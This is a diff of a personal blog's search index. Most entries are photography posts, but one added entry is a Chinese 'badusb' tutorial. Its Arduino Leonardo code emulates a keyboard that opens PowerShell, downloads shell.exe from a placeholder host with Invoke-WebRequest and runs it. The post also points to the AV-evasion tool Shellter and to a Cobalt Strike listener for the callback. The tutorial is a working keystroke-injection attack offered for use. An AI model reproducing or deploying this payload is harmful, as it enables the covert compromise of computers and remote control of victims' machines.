@@ -1,6 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>badusb</title>
+    <url>/2023/06/02/badusb/</url>
+    <content><![CDATA[<h1>Arduino  Leonardo 制作badusb</h1>
+<h3 id="badusb是什么❓">Badusb是什么❓</h3>
+<p>计算机或者其它设备&quot;承认&quot;我们插入的硬件为键盘鼠标，Leonardo就可以模拟键盘鼠标操作，输入一些指令。</p>
+<h3 id="arduino-leonardo-什么样子？">Arduino  Leonardo 什么样子？</h3>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1685543471012-81399cab-d581-4e7b-af3c-8be196c33da3.jpeg" alt="IMG_9809.jpeg" style="zoom: 25%;" />
+<h3 id="arduino-ide-下载">arduino IDE 下载</h3>
+<p><a href="https://www.arduino.cc/en/software">下载链接</a></p>
+<h3 id="免杀工具shellter下载">免杀工具shellter下载</h3>
+<p><a href="https://www.shellterproject.com/download/">下载链接</a></p>
+<h3 id="badusb-代码">badusb 代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void setup() </span><br><span class="line">&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    Keyboard.begin();</span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); // 模拟按下 Windows 键</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>); // 模拟按下 R 键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); //利用开大写输小写绕过输入法</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);//</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;powershell&quot;</span>); // 输入 powershell 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$url = \&quot;http://ip/shell.exe\&quot;&quot;</span>);  //输入远程服务器上的程序路径</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$filePath = \&quot;$env:USERPROFILE\\Desktop\\shell.exe\&quot;&quot;</span>);  //安装目录 </span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Invoke-WebRequest -Uri  $url  -OutFile  $filePath&quot;</span>); // 输入下载命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Start-Process  -FilePath  $filePath&quot;</span>); // 输入执行命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;exit&quot;</span>); // 输入 exit 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    Keyboard.end(); // 结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">// 空循环</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="然后利用cs监听上线即可">然后利用cs监听上线即可</h4>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/image-20230602112516109.png" alt="image-20230602112516109"></p>
+]]></content>
+      <tags>
+        <tag>硬件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>南澳西涌&amp;长曝光</title>
     <url>/2023/03/21/%E4%B8%9C%E6%B6%8C-%E9%95%BF%E6%9B%9D%E5%85%89/</url>
     <content><![CDATA[<blockquote>
@@ -40,23 +61,6 @@
       </tags>
   </entry>
   <entry>
-    <title>拒接灰色</title>
-    <url>/2023/03/13/%E6%8B%92%E6%8E%A5%E7%81%B0%E8%89%B2/</url>
-    <content><![CDATA[<h1>拒接灰色</h1>
-<p><img src="https://p.ipic.vip/7iql8h.jpg" alt=""><br>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04176.jpg" alt=""><br>
-<img src="https://p.ipic.vip/1fdp25.jpg" alt=""><br>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04056.jpg" alt=""></p>
-<p><img src="https://p.ipic.vip/dkd8z4.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>黑白</category>
-      </categories>
-      <tags>
-        <tag>黑白对比</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>抽象派</title>
     <url>/2023/03/14/%E6%8A%BD%E8%B1%A1%E6%B4%BE/</url>
     <content><![CDATA[<h1>抽象派</h1>
@@ -72,6 +76,23 @@
       </categories>
       <tags>
         <tag>大光圈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>拒接灰色</title>
+    <url>/2023/03/13/%E6%8B%92%E6%8E%A5%E7%81%B0%E8%89%B2/</url>
+    <content><![CDATA[<h1>拒接灰色</h1>
+<p><img src="https://p.ipic.vip/7iql8h.jpg" alt=""><br>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04176.jpg" alt=""><br>
+<img src="https://p.ipic.vip/1fdp25.jpg" alt=""><br>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04056.jpg" alt=""></p>
+<p><img src="https://p.ipic.vip/dkd8z4.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>黑白</category>
+      </categories>
+      <tags>
+        <tag>黑白对比</tag>
       </tags>
   </entry>
   <entry>
@@ -183,6 +204,19 @@
       </categories>
       <tags>
         <tag>珠海</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>空气压缩</title>
+    <url>/2023/06/02/%E7%A9%BA%E6%B0%94%E5%8E%8B%E7%BC%A9/</url>
+    <content><![CDATA[<blockquote>
+<p>感受一下长焦200mm焦段的空间压缩感吧！！</p>
+</blockquote>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC07408.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC07416.jpg" alt=""></p>
+]]></content>
+      <tags>
+        <tag>长焦</tag>
       </tags>
   </entry>
 </search>
